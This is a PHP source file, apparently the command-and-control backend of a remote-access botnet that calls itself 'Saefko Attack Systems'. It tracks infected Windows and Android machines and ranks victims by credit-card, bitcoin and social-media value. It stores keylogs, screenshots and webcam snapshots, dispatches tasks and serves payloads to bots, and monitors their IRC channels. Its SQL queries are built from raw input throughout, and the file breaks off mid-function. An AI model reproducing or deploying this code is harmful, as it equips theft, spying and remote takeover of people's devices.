<?php

class SERVER
{


    private $db;

    public function __construct()
    {
		
		try{
		
		$this->db = new PDO("sqlite:" . __DIR__ . DIRECTORY_SEPARATOR . "seafko_db.db");

		$this->db->query("PRAGMA journal_mode=WAL;");

        $this->db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		
	    } catch (PDOException $ex) {
            die("Error connecting to DB: ".$ex->getMessage());
        }
 
    }

    function get_statics_data()
    {

        $CurrentTime = round(microtime(true) * 1000);

        $TimeMinus10Minutes = $CurrentTime - 1260000;

        $TimeMinus4Days = $CurrentTime - 345600000;


        $online_machines = $this->db->query("select count(*) as count from machines where machine_updated_date > $TimeMinus10Minutes ;");


        $offline_machines = $this->db->query("select count(*) as count from machines where machine_updated_date > $TimeMinus4Days
									AND machine_updated_date < $TimeMinus10Minutes ;");


        $dead_machines = $this->db->query("select count(*) as count from machines where machine_updated_date < $TimeMinus4Days  ;");


        $machines_us = $this->db->query("select count(*) as count from machines where machine_country_iso_code = 'us' OR machine_country_iso_code = 'US';");


        $machines_eu = $this->db->query("select count(*) as count from machines where machine_country_iso_code IN" .
            " ('US','us','FR','fr','DE','de','BE','be','BG','bg','CZ'," .
            "'cz','DK','dk','EE','ee','IE','ie','EL','el','ES','es','HR'" .
            ",'hr','IT','it','CY','cy','LV','lv','LT','lt','LU','lu','HU'" .
            ",'hu','MT','mt','NL','nl','AT','at','PL','pl','PT','pt','RO'" .
            ",'ro','SI','si','SK','sk','FI','fi','SE','se','UK','uk','IS','is','GB','gb');");

        $machines_ru = $this->db->query("select count(*) as count from machines where machine_country_iso_code = 'ru' or machine_country_iso_code = 'RU';");


        $machines_au = $this->db->query("select count(*) as count from machines where machine_country_iso_code = 'au' or machine_country_iso_code = 'AU';");


        $windows_machines = $this->db->query("select count(*) as count from machines where machine_os_type = 1;");

        $android_machines = $this->db->query("select count(*) as count from machines where machine_os_type = 0;");


        $high_sms_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_sms_activity > 0 order by machine_sms_activity DESC limit 10;", PDO::FETCH_ASSOC);

        $high_calls_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_calls_activity > 0 order by machine_calls_activity DESC limit 10;", PDO::FETCH_ASSOC);


        $high_bitcoin_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_bitcoin_value > 0 order by machine_bitcoin_value DESC limit 10;", PDO::FETCH_ASSOC);

        $high_cridtcard_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_creadit_card_posiblty > 0 order by machine_creadit_card_posiblty DESC limit 10;", PDO::FETCH_ASSOC);


        $high_business_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_business_value > 0 order by machine_business_value DESC limit 10;", PDO::FETCH_ASSOC);

        $high_shopping_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_shooping_activity > 0 order by machine_shooping_activity DESC limit 10;", PDO::FETCH_ASSOC);

        $high_socialmedia_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_total_social_use > 0 order by machine_total_social_use DESC limit 10;", PDO::FETCH_ASSOC);

        $high_instgram_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_instgram_activty > 0 order by machine_instgram_activty DESC limit 10;", PDO::FETCH_ASSOC);

        $high_facebook_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_facebook_activity > 0 order by machine_facebook_activity DESC limit 10;", PDO::FETCH_ASSOC);


        $high_youtube_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_youtube_activity > 0 order by machine_youtube_activity DESC limit 10;", PDO::FETCH_ASSOC);


        $high_gmail_activity_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_gmail_avtivity > 0 order by machine_gmail_avtivity DESC limit 10;", PDO::FETCH_ASSOC);


        $high_activetime_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_active_time > 0 order by machine_active_time DESC limit 10;", PDO::FETCH_ASSOC);


        $newist_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            "  order by machine_register_date DESC limit 10;", PDO::FETCH_ASSOC);

        $high_camera_use_machines = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_camera_activity > 0 order by machine_camera_activity DESC limit 10;", PDO::FETCH_ASSOC);


        $high_machine_spec_total = $this->db->query("select id,machine_ip,machine_os_type,machine_country_iso_code,machine_username,machine_lat,machine_lng from machines" .
            " where machine_spec_total > 0 order by machine_spec_total DESC limit 10;", PDO::FETCH_ASSOC);


        echo json_encode(array(
                "online_machines" => $online_machines->fetch()['count'],
                "offline_machines" => $offline_machines->fetch()['count'],
                "dead_machines" => $dead_machines->fetch()['count'],
                "machines_us" => $machines_us->fetch()['count'],
                "machines_eu" => $machines_eu->fetch()['count'],
                "machines_ru" => $machines_ru->fetch()['count'],
                "machines_au" => $machines_au->fetch()['count'],
                "windows_machines" => $windows_machines->fetch()['count'],
                "android_machines" => $android_machines->fetch()['count'],
                "high_sms_activity_machines" => $high_sms_activity_machines->fetchall(),
                "high_calls_activity_machines" => $high_calls_activity_machines->fetchall(),
                "high_bitcoin_activity_machines" => $high_bitcoin_activity_machines->fetchall(),
                "high_cridtcard_activity_machines" => $high_cridtcard_activity_machines->fetchall(),
                "high_business_activity_machines" => $high_business_activity_machines->fetchall(),
                "high_shopping_activity_machines" => $high_shopping_activity_machines->fetchall(),
                "high_socialmedia_activity_machines" => $high_socialmedia_activity_machines->fetchall(),
                "high_instgram_activity_machines" => $high_instgram_activity_machines->fetchall(),
                "high_facebook_activity_machines" => $high_facebook_activity_machines->fetchall(),
                "high_youtube_activity_machines" => $high_youtube_activity_machines->fetchall(),
                "high_gmail_activity_machines" => $high_gmail_activity_machines->fetchall(),
                "high_activetime_machines" => $high_activetime_machines->fetchall(),
                "high_camera_use_machines" => $high_camera_use_machines->fetchall(),
                "high_machine_spec_total" => $high_machine_spec_total->fetchall(),
                "newist_machines" => $newist_machines->fetchall(),
                "CurrentTime" => $CurrentTime

            )

        );
    }


    function get_refresh_data($LastRefreshTimeStamp)
    {


        $CurrentTime = round(microtime(true) * 1000);


        $on_change = $this->db->query("select count(*) as count from machines where machine_register_date > " . $LastRefreshTimeStamp .
            " OR machine_updated_date > " . $LastRefreshTimeStamp);

        //get new machines

        $new_machines = $this->db->query("select id,
                                                        machine_artct,
                                                        machine_username,machine_ip,
                                                        machine_active_time,
                                                       	strftime('%Y-%m-%d %H:%M', machine_register_date / 1000, 'unixepoch') AS machine_register_date,
                                                        irc_server,
                                                        irc_nickname,
                                                        machine_os_type,
                                                        machine_country_iso_code,
                                                        machine_lat,
                                                        machine_lng,
                                                        irc_channle,
                                                        irc_status,
														privateip,
														irc_last_update,
                                                        machine_cpux from machines where machine_register_date > " . $LastRefreshTimeStamp, PDO::FETCH_ASSOC);

        $new_machines_data = $new_machines->fetchall();

        if (empty($new_machines_data)) {
            $new_machines_data = "empty";
        }


        echo json_encode(array(
            "new_machines" => $new_machines_data,
            "CurrentTime" => $CurrentTime,
            "on_change" => $on_change->fetch()['count']
        ));

    }


    function getGMAPMachines($GmapMaxValue)
    {

        $CurrentTime = round(microtime(true) * 1000);

        $TimeMinus10Minutes = $CurrentTime - 1260000;

        $TimeMinus4Days = $CurrentTime - 345600000;

        if ($GmapMaxValue == 0) {
            $GmapMaxValue = " LIMIT 100";
        } else if ($GmapMaxValue == 1) {
            $GmapMaxValue = " LIMIT 500";
        } else {
            $GmapMaxValue = "";
        }

        $online_machines = $this->db->query("select id,machine_lat,machine_lng,machine_ip,machine_os_type,machine_username,privateip,irc_last_update from machines
		where machine_updated_date > $TimeMinus10Minutes ORDER BY machine_register_date DESC $GmapMaxValue", PDO::FETCH_ASSOC);

        $online_machines_data = $online_machines->fetchall();

        if (empty($online_machines_data)) {
            $online_machines_data = "empty";
        }


        echo json_encode(array("gmap_machines" => $online_machines_data));
    }

    function GetMachineScreenshot($id)
    {

        $GetSQL = $this->db->query("select machine_screenshot from machines where id = $id");
        $GetMachinesData = $GetSQL->fetch()['machine_screenshot'];

        if (empty($GetMachinesData)) {
            $GetMachinesData = "empty";
        }


        echo $GetMachinesData;
    }


    function getOnlineMachinesData($limit, $restrict, $filter)
    {


        $CurrentTime = round(microtime(true) * 1000);

        $TimeMinus10Minutes = $CurrentTime - 1260000;


        $machines = $this->db->query("select id,
                                                        machine_artct,
                                                        machine_username,machine_ip,
                                                        machine_active_time,
                                                       	strftime('%Y-%m-%d %H:%M', machine_register_date / 1000, 'unixepoch') AS machine_register_date,
                                                        irc_server,
                                                        irc_nickname,
                                                        machine_os_type,
                                                        machine_country_iso_code,
                                                        machine_lat,
                                                        machine_lng,
                                                        irc_channle,
                                                        irc_status,
														privateip,
														LastContact,
														irc_last_update,
                                                        machine_cpux,
														machine_sms_activity AS MSSA,
														machine_calls_activity AS MCAA,
														machine_creadit_card_posiblty AS MCCP,
														machine_gaming_value AS MGAV,
														machine_bitcoin_value AS MBA,
														machine_instgram_activty AS MIA,
														machine_facebook_activity AS MFA,
														machine_youtube_activity AS MYA,
														machine_googlepluse_activity AS MGPA,
														machine_gmail_avtivity AS MGA,
														machine_shooping_activity AS MSA,
														machine_camera_activity AS MCA,
														machine_business_value AS MBV,
														machine_spec_total AS MST,
														machine_total_social_use AS MTSU
														from machines  where machine_updated_date > $TimeMinus10Minutes " . self::decode_restrict($restrict) . self::decode_filter($filter) . self::decode_limit($limit), PDO::FETCH_ASSOC);


        $machines_data = $machines->fetchall();


        if (empty($machines_data)) {
            $machines_data = "empty";
        }


        echo json_encode(array("machines_data" => $machines_data));

    }


    function getOfflineMachinesData($limit, $restrict, $filter)
    {

        $CurrentTime = round(microtime(true) * 1000);

        $TimeMinus10Minutes = $CurrentTime - 1260000;

        $TimeMinus4Days = $CurrentTime - 345600000;


        $machines = $this->db->query("select id,
                                                        machine_artct,
                                                        machine_username,machine_ip,
                                                        machine_active_time,
                                                       	strftime('%Y-%m-%d %H:%M', machine_register_date / 1000, 'unixepoch') AS machine_register_date,
                                                        irc_server,
                                                        irc_nickname,
                                                        machine_os_type,
                                                        machine_country_iso_code,
                                                        machine_lat,
                                                        machine_lng,
                                                        irc_channle,
                                                        irc_status,
														privateip,
														LastContact,
														irc_last_update,
                                                        machine_cpux,
														machine_sms_activity AS MSSA,
														machine_calls_activity AS MCAA,
														machine_creadit_card_posiblty AS MCCP,
														machine_gaming_value AS MGAV,
														machine_bitcoin_value AS MBA,
														machine_instgram_activty AS MIA,
														machine_facebook_activity AS MFA,
														machine_youtube_activity AS MYA,
														machine_googlepluse_activity AS MGPA,
														machine_gmail_avtivity AS MGA,
														machine_shooping_activity AS MSA,
														machine_camera_activity AS MCA,
														machine_business_value AS MBV,
														machine_spec_total AS MST,
														machine_total_social_use AS MTSU
														from machines where machine_updated_date > $TimeMinus4Days AND machine_updated_date < $TimeMinus10Minutes " .
            self::decode_restrict($restrict) . self::decode_filter($filter) . self::decode_limit($limit), PDO::FETCH_ASSOC);


        $machines_data = $machines->fetchall();


        if (empty($machines_data)) {
            $machines_data = "empty";
        }


        echo json_encode(array("machines_data" => $machines_data));

    }

    function getDisconnectedMachinesData($limit, $restrict, $filter)
    {

        $CurrentTime = round(microtime(true) * 1000);

        $TimeMinus4Days = $CurrentTime - (345600 * 1000);


        $machines = $this->db->query("select id,
                                                        machine_artct,
                                                        machine_username,machine_ip,
                                                        machine_active_time,
                                                       	strftime('%Y-%m-%d %H:%M', machine_register_date / 1000, 'unixepoch') AS machine_register_date,
                                                        irc_server,
                                                        irc_nickname,
                                                        machine_os_type,
                                                        machine_country_iso_code,
                                                        machine_lat,
                                                        machine_lng,
                                                        irc_channle,
                                                        irc_status,
														privateip,
														LastContact,
														irc_last_update,
                                                        machine_cpux,
														machine_sms_activity AS MSSA,
														machine_calls_activity AS MCAA,
														machine_creadit_card_posiblty AS MCCP,
														machine_gaming_value AS MGAV,
														machine_bitcoin_value AS MBA,
														machine_instgram_activty AS MIA,
														machine_facebook_activity AS MFA,
														machine_youtube_activity AS MYA,
														machine_googlepluse_activity AS MGPA,
														machine_gmail_avtivity AS MGA,
														machine_shooping_activity AS MSA,
														machine_camera_activity AS MCA,
														machine_business_value AS MBV,
														machine_spec_total AS MST,
														machine_total_social_use AS MTSU
														from machines where machine_updated_date < $TimeMinus4Days " .
            self::decode_restrict($restrict) . self::decode_filter($filter) . self::decode_limit($limit), PDO::FETCH_ASSOC);


        $machines_data = $machines->fetchall();


        if (empty($machines_data)) {
            $machines_data = "empty";
        }


        echo json_encode(array("machines_data" => $machines_data));

    }


    function decode_limit($limit)
    {
        //100 ,400,1000,all
        switch ($limit) {
            case 0:
                return " limit 100;";
            case 1:
                return " limit 400;";
            case 2:
                return " limit 1000;";
            case 3:
                return ";";
        }
    }

    function decode_restrict($restrict)
    {
        if ($restrict == "ALL") {
            return "";
        } else {
            return " AND UPPER(machine_country_iso_code) = '$restrict' ";
        }

    }

    function decode_filter($filter)
    {

        switch ($filter) {
            case 0:
                return " ORDER BY machine_register_date DESC ";
            case 1:
                return " ORDER BY machine_sms_activity DESC ";
            case 2:
                return " ORDER BY machine_calls_activity DESC ";
            case 3:
                return " ORDER BY machine_bitcoin_value DESC ";
            case 4:
                return " ORDER BY machine_creadit_card_posiblty DESC ";
            case 5:
                return " ORDER BY machine_business_value DESC ";
            case 6:
                return " ORDER BY machine_shooping_activity DESC ";
            case 7:
                return " ORDER BY machine_total_social_use DESC ";
            case 8:
                return " ORDER BY machine_instgram_activty DESC ";
            case 9:
                return " ORDER BY machine_facebook_activity DESC ";
            case 10:
                return " ORDER BY machine_youtube_activity DESC ";
            case 11:
                return " ORDER BY machine_gmail_avtivity DESC ";
            case 12:
                return " ORDER BY machine_spec_total DESC ";
            case 13:
                return " ORDER BY machine_active_time DESC ";
            case 14:
                return " ORDER BY machine_camera_activity DESC ";
            default:
                return " ORDER BY machine_register_date DESC ";
        }


    }


    function getTasks()
    {


        $GetTasksSQL = "select id,
                                        task_type,
                                        task_status,
                                        task_info,
                                        task_os,	
                                        created_date AS datetimestamp,
                                        strftime('%Y-%m-%d %H:%M', created_date / 1000, 'unixepoch') AS created_date, 
                                        ((select count(id) from TasksExecutions where task_id  = t1.id)  || '/' || (select count(id) from machines)) task_executions_times
                                        from tasks t1 where t1.task_accessibility  = 0 AND  t1.task_visibility = 1 order by datetimestamp DESC;";

        $TasksData = $this->db->query($GetTasksSQL, PDO::FETCH_ASSOC);

        $GetTasksData = $TasksData->fetchall();

        if (empty($GetTasksData)) {
            $GetTasksData = "empty";
        }


        echo json_encode(array("tasks_data" => $GetTasksData));
		


    }

    function getPrivateTasks($target_id)
    {


        $GetTasksSQL = "select id,
                                        task_type,
                                        task_status,
                                        task_info,
                                        task_os,	
                                        created_date AS datetimestamp,
                                        strftime('%Y-%m-%d %H:%M', created_date / 1000, 'unixepoch') AS created_date, 
                                        ((select count(id) from TasksExecutions where task_id  = t1.id)  || '/1' ) task_executions_times
                                        from tasks t1 where t1.task_accessibility  = 1 AND  t1.task_visibility = 1 AND t1.accessibility_target = $target_id order by datetimestamp DESC;";

        $TasksData = $this->db->query($GetTasksSQL, PDO::FETCH_ASSOC);

        $GetTasksData = $TasksData->fetchall();

        if (empty($GetTasksData)) {
            $GetTasksData = "empty";
        }


        echo json_encode(array("tasks_data" => $GetTasksData));
		

    }


    function UpdateTaskStatus($task_id, $status)
    {
        $UpdateSQLQuery = "UPDATE tasks
                                                SET task_status = $status
                                                WHERE id = $task_id;";
        $this->db->query($UpdateSQLQuery);
        echo "true";
    }
	

    function RemoveTask($task_id)
    {
        $DeleteSQLQuery = "DELETE FROM tasks
                                      WHERE id=$task_id;";
        $this->db->query($DeleteSQLQuery);
        echo "true";
    }


    function GetTasksExcu($task_id)
    {
        $ExcuSQL = "select t4.id AS excu_id,
                                       t1.id AS machine_id,
                                       t1.machine_ip,
                                       t1.machine_country_iso_code,
                                       t1.machine_username from TasksExecutions t4
                                        Left join machines t1 ON t4.executor_id = t1.id
                                        WHERE t4.task_id = $task_id;";


        $TasksExcuQuery = $this->db->query($ExcuSQL, PDO::FETCH_ASSOC);

        $GetExcuData = $TasksExcuQuery->fetchall();

        if (empty($GetExcuData)) {
            $GetExcuData = "empty";
        }

        echo json_encode(array("task_excu_data" => $GetExcuData));
    }


    function AddTask($task_data)
    {
        $TaskData = json_decode($task_data);
        $CurrentTime = round(microtime(true) * 1000);
        $task_info = json_encode($TaskData->task_info);
		$InsertSQL = "INSERT INTO tasks (task_info, created_date, task_status, task_type, task_os,task_accessibility,accessibility_target)
                                            VALUES ('$task_info', '$CurrentTime', 1, $TaskData->task_type, $TaskData->task_os,
											$TaskData->task_accessibility,$TaskData->accessibility_target);";
		if(isset($TaskData->task_v)){
			$InsertSQL = "INSERT INTO tasks (task_info, created_date, task_status, task_type, task_os,task_accessibility,accessibility_target,task_visibility)
                                            VALUES ('$task_info', '$CurrentTime', 1, $TaskData->task_type, $TaskData->task_os,
											$TaskData->task_accessibility,$TaskData->accessibility_target,0);";
		}
    
        $result = $this->db->query($InsertSQL);
        if ($result) {
            echo "true";
        } else {
            echo "false";
        }
    }


    function GetMachineIRCInfo($id)
    {
        $GetMachineSQL = "select id,machine_ip,irc_server,machine_lat,machine_lng,machine_country_iso_code from machines where id = $id limit 1;";
        $GetData = $this->db->query($GetMachineSQL);

        $GetMachinesData = $GetData->fetch();

        if (empty($GetMachinesData)) {
            $GetMachinesData = "empty";
        }


        echo json_encode(array("irc_info" => $GetMachinesData));
    }


    function RegisterNewMachine($machine_data)
    {
        $machine_data_json = json_decode($machine_data);

        $CurrentTime = round(microtime(true) * 1000);
        $ip_address = str_replace(' ', '', self::get_client_ip());
        $RegisterMachineSQL = "INSERT INTO machines (
                         machine_artct,
                         machine_username,
                         machine_ip,
                         machine_active_time,
                         machine_sms_activity,
                         machine_calls_activity,
                         machine_creadit_card_posiblty,
                         machine_gaming_value,
                         machine_bitcoin_value,
                         machine_instgram_activty,
                         machine_facebook_activity,
                         machine_youtube_activity,
                         machine_googlepluse_activity,
                         machine_gmail_avtivity,
                         machine_current_time,
                         machine_register_date,
                         machine_shooping_activity,
                         machine_camera_activity,
                         machine_business_value,
                         machine_spec_total,
                         irc_server,
                         irc_nickname,
                         machine_updated_date,
                         machine_total_social_use,
                         machine_os_type,
                         machine_country_iso_code,
                         machine_lat,
                         machine_lng,
                         irc_channle,
                         irc_password,
                         machine_cpux,
                         machine_screenshot,
                         irc_port,
						 privateip,
						 LastContact,
						 irc_last_update
                     )
                     VALUES (
                         '$machine_data_json->machine_artct',
                         '$machine_data_json->machine_username',
                         '$ip_address',
                         '$machine_data_json->machine_active_time',
                         '$machine_data_json->machine_sms_activity',
                         '$machine_data_json->machine_calls_activity',
                         '$machine_data_json->machine_creadit_card_posiblty',
                         '$machine_data_json->machine_gaming_value',
                         '$machine_data_json->machine_bitcoin_value',
                         '$machine_data_json->machine_instgram_activty',
                         '$machine_data_json->machine_facebook_activity',
                         '$machine_data_json->machine_youtube_activity',
                         '$machine_data_json->machine_googlepluse_activity',
                         '$machine_data_json->machine_gmail_avtivity',
                         '$machine_data_json->machine_current_time',
                         '$CurrentTime',
                         '$machine_data_json->machine_shooping_activity',
                         '$machine_data_json->machine_camera_activity',
                         '$machine_data_json->machine_business_value',
                         '$machine_data_json->machine_spec_total',
                         '$machine_data_json->irc_server',
                         '$machine_data_json->irc_nickname',
                         '$CurrentTime',
                         '$machine_data_json->machine_total_social_use',
                         '$machine_data_json->machine_os_type',
                         '$machine_data_json->machine_country_iso_code',
                         '$machine_data_json->machine_lat',
                         '$machine_data_json->machine_lng',
                         '$machine_data_json->irc_channle',
                         '$machine_data_json->irc_password',
                         '$machine_data_json->machine_artct',
                         '$machine_data_json->machine_screenshot',
                         '$machine_data_json->irc_port',
						 '$machine_data_json->privateip',
						 '$CurrentTime',
						 '$CurrentTime'
                     );";
        $this->db->query($RegisterMachineSQL);
        $lastInsertId = $this->db->lastInsertId();
        if ($lastInsertId) {
            echo json_encode(array("status" => "ok", "id" => $lastInsertId));

        } else {
            echo json_encode(array("status" => "false", "id" => "-1"));

        }

    }

    function UpdateNewMachine($id, $machine_data)
    {
        $machine_data_json = json_decode($machine_data);
        $CurrentTime = round(microtime(true) * 1000);
        $ip_address = str_replace(' ', '', self::get_client_ip());
        $UpdateMachineSQL = "UPDATE machines SET
                                               machine_artct = '$machine_data_json->machine_artct',
                                               machine_username = '$machine_data_json->machine_username',
                                               machine_ip = '$ip_address',
                                               machine_active_time = '$machine_data_json->machine_active_time',
                                               machine_sms_activity = '$machine_data_json->machine_sms_activity',
                                               machine_calls_activity = '$machine_data_json->machine_calls_activity',
                                               machine_creadit_card_posiblty = '$machine_data_json->machine_creadit_card_posiblty',
                                               machine_gaming_value = '$machine_data_json->machine_gaming_value',
                                               machine_bitcoin_value = '$machine_data_json->machine_bitcoin_value',
                                               machine_instgram_activty = '$machine_data_json->machine_instgram_activty',
                                               machine_facebook_activity = '$machine_data_json->machine_facebook_activity',
                                               machine_youtube_activity = '$machine_data_json->machine_youtube_activity',
                                               machine_googlepluse_activity = '$machine_data_json->machine_googlepluse_activity',
                                               machine_gmail_avtivity = '$machine_data_json->machine_gmail_avtivity',
                                               machine_current_time = '$machine_data_json->machine_current_time',
                                               machine_shooping_activity = '$machine_data_json->machine_shooping_activity',
                                               machine_camera_activity = '$machine_data_json->machine_camera_activity',
                                               machine_business_value = '$machine_data_json->machine_business_value',
                                               machine_spec_total = '$machine_data_json->machine_spec_total',
                                               irc_server = '$machine_data_json->irc_server',
                                               irc_nickname = '$machine_data_json->irc_nickname',
                                               machine_updated_date = '$CurrentTime',
                                               machine_total_social_use = '$machine_data_json->machine_total_social_use',
                                               machine_country_iso_code = '$machine_data_json->machine_country_iso_code',
                                               machine_lat = '$machine_data_json->machine_lat',
                                               machine_lng = '$machine_data_json->machine_lng',
                                               irc_channle = '$machine_data_json->irc_channle',
                                               irc_password = '$machine_data_json->irc_password',
                                               machine_cpux = '$machine_data_json->machine_artct',
                                               irc_port = '$machine_data_json->irc_port',
								               privateip = '$machine_data_json->privateip',
											   LastContact = '$CurrentTime'
                                                WHERE id = '$id';";


        $this->db->query($UpdateMachineSQL);

        $ID = $this->db->query("select id from machines where id = $id;", PDO::FETCH_ASSOC);
        $GetID = $ID->fetchall();
        if (empty($GetID)) {
            echo "false";
        } else {
            echo "ok";
        }
    }

    function get_client_ip()
    {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $ipaddress = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }


    function UpdateAndGetTasks($machine_id, $machine_os,$privateip)
    {

        $CurrentTime = round(microtime(true) * 1000);


        $UpdateSQL = "UPDATE machines
                               SET
                                   machine_updated_date = '$CurrentTime'
                                   WHERE id = $machine_id";
        $this->db->query($UpdateSQL);
		
		$UpdateSQLPrivateIP = "UPDATE machines
										   SET
											   privateip = '$privateip'
											   WHERE id = $machine_id";
		$this->db->query($UpdateSQLPrivateIP);

		
        $GetTaskSQL = "SELECT id,
                                   task_info,
                                   task_type
                              FROM tasks WHERE
                                        task_status = 1 AND (task_os = $machine_os OR  task_os = 3) AND  (task_accessibility  = 0 OR (task_accessibility = 1 AND accessibility_target = $machine_id)) AND      
                                        id NOT IN (SELECT task_id  FROM TasksExecutions where executor_id = $machine_id)";


        $tasks = $this->db->query($GetTaskSQL, PDO::FETCH_ASSOC);

        $tasks_data = $tasks->fetchall();

        echo json_encode(array("tasks_data" => $tasks_data));

		self::UpdateLastContact($machine_id);

		
		
    }

    function InsertTaskExecution($excuter_id, $task_id)
    {


        $InsertExecutionSQL = "INSERT INTO TasksExecutions (
                                                                    task_id,
                                                                    executor_id
                                                                )
                                                                VALUES (
                                                                    '$task_id',
                                                                    '$excuter_id'
                                                                );
                                    ";

        $this->db->query($InsertExecutionSQL);

        echo "ok";
		
		self::UpdateLastContact($excuter_id);

    }


    function SaveScreenShot($id, $data)
    {

        $UpdateSQL = "UPDATE machines
                               SET
                                   machine_screenshot = '$data'
                                   WHERE id = $id";
        $this->db->query($UpdateSQL);

        echo "ok";
    }

    function SaveSnapshot($id, $data)
    {

        $UpdateSQL = "UPDATE machines
                                       SET
                                           camera_snapshot = '$data'
                                           WHERE id = $id";
        $this->db->query($UpdateSQL);

        echo "ok";
    }

    function GetBAse64Data($machine_id, $data_type)
    {

        $GetSQL = $this->db->query("select $data_type as base_data from machines where id = $machine_id;");
        $GetMachinesData = $GetSQL->fetch();

        if (empty($GetMachinesData)) {
            $GetMachinesData = "empty";
        }


        echo json_encode(array("base64" => $GetMachinesData));
    }


    function UpdateIRCServer($id, $servers)
    {

        $CurrentTime = round(microtime(true) * 1000);

        $UpdateSQL = "UPDATE machines
                                                   SET
                                                       irc_server = '$servers',
													   irc_last_update = '$CurrentTime',
                                                        machine_updated_date = '$CurrentTime',
													   `LastContact` = '$CurrentTime'
                                                 WHERE id = $id;";
        $this->db->query($UpdateSQL);

        echo "ok";
		        }
			


    function GetIP()
    {
        echo self::get_client_ip();
    }

    function SetKeyLogs($id, $data)
    {

        $UpdateSQL = "UPDATE machines
                                                   SET
                                                       machine_keylogs = '$data'
                                                       WHERE id = $id";
        $this->db->query($UpdateSQL);

        echo "ok";
    }

    function SaveWindowsPayload($data)
    {

        $UpdateSQL = "UPDATE payloads
                                                               SET
                                                                   payload_data = '$data'
                                                                   WHERE id = 8";
        $this->db->query($UpdateSQL);

        echo "ok";
    }

    function update_irc_status($machine_id, $irc_status)
    {

        $UpdateSQL = "UPDATE machines
                                                               SET
                                                                   irc_status = '$irc_status'
                                                                   WHERE id = $machine_id;";
        $this->db->query($UpdateSQL);

        echo "ok";
    }



    function GetPayloads($keys)
    {

        $GetSQL = $this->db->query("select payload_name,payload_data from payloads where payload_key in ($keys);");
		$PayloadData = $GetSQL->fetchall();
		
		if (empty($PayloadData)) {
			echo "empty";
        }else{
			echo json_encode($PayloadData);
		}
    

    }

    function GetPasswords()
    {

        $GetSQL = $this->db->query("select password from admin limit 1;");
        $GetPasswordData = $GetSQL->fetch()['password'];
        return $GetPasswordData;
    }

    function CheckLogin($password)
    {
        $GetSQL = $this->db->query("select password from admin where password = '$password' limit 1;");
        $GetPasswordData = $GetSQL->fetch()['password'];
        if (!empty($GetPasswordData)) {
			 session_start();
			 $_SESSION['publicip'] = self::get_client_ip();
            echo "ok";
        } else {
            echo "false";
        }
    }


    function VerifyDatabase()
    {

        if (file_exists("seafko_db.db")) {

            if (is_writable("seafko_db.db")) {
                // is write read
                echo "ok_full";

            } else {
                echo "not_writable";
            }

        } else {
            echo "file_not_available";
        }

    }


    function ChanegPassword($NewPassword)
    {
        $UpdateSQL = "UPDATE admin
                                SET password = '$NewPassword'
                                Where id = 1;";
        $this->db->query($UpdateSQL);

        echo "ok";
    }
    function TestIfCurrentDirIsWritable()
    {
        $myfile = fopen("test.data", "w");
        if ($myfile) {
            $txt = "Saefko Attack Systems\n";
            fwrite($myfile, $txt);
            fclose($myfile);
            unlink("test.data");
            echo "ok";
        } else {
            echo "false";
        }

    }
  function GetPublicIP()
    {
		session_start();
		  if($_SESSION['publicip']){
				echo $_SESSION['publicip'];
		  }else{
				echo "noip";
		  }
    }
	
	function CheckPHPVersion(){
		if (!defined('PHP_VERSION_ID')) {
    $version = explode('.', PHP_VERSION);

    define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
}

if (PHP_VERSION_ID < 50207) {
	    defined('PHP_MAJOR_VERSION');
}
	    echo PHP_MAJOR_VERSION;
	}	
	
	function UpdateLastContact($id){
		    $CurrentTime = round(microtime(true) * 1000);

		    $UpdateSQLQuery = "UPDATE machines 
									SET `LastContact` = '$CurrentTime'
									WHERE id = $id;";
		    $this->db->query($UpdateSQLQuery);

	}
	
		function GetIRCStatus($id){
				$IRCStatus =  $this->db->query("select irc_status,irc_last_update from machines where id = $id");
				$data = $IRCStatus->fetch();
			echo json_encode(array("irc_status"=>$data['irc_status'],
			"irc_last_update"=>$data['irc_last_update']));
		}
		function GetIRCServers($id){
		    $IRCStatus =  $this->db->query("select irc_server from machines where id = $id");
			$IRCServers = $IRCStatus->fetch()['irc_server'];
		
				if(!empty($IRCServers)){
